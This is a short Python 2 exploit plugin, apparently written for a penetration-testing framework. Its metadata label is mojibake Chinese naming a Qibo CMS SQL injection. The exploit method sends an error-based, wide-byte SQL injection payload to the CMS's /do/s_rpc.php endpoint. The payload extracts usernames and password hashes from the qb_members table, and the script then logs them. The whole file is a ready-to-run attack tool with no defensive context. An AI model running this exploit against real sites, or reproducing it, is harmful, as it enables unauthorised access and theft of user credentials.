# -*- coding: utf-8 -*-
class mstplugin:
    infos = [
        ['Plugin','Æë²©CMS SQL×¢ÈëExploit'],
        ['Author','Mr.x'],
        ['Update','2013/11/6'],
        ['QQ','414106785'],
        ]
    opts  = [
        ['URL','localhost','Url'],
        ['PATH','/','Cms path'],
        ['PORT','80','port']
        ]
    def post(self,url,value):
        '''url post'''
        data    = value
        headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }
        res     = urllib2.Request(url,data,headers)
        ok  = urllib2.urlopen(res)
        return ok


    def exploit(self):
        url   = fuck.urlformate(URL,PORT,PATH)+"/do/s_rpc.php"
        poc   = 'queryString=111%df\'+union+select+1+from+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x3a,username,0x3d,password,0x3a)+from+qb_members))a+from+information_schema.tables+group+by+a)b%23'
        try:
            color.cprint("[+] Sending exp ..",YELLOW)
            res= self.post(url,poc)
            ok = fuck.find('\w+=\w{32}',res.read())[0]
            if len(ok)>0:
                color.cprint("[*] Exploit Successful !\n[*] %s"%ok,GREEN)
                fuck.writelog("qibo_cms_s_rpc_php_sqli",URL+"::"+ok)
            else:
                color.cprint("[!] Exploit False !",RED)
        except Exception,e:
            color.cprint("[!] ERR! CODE:%s"%e,RED)
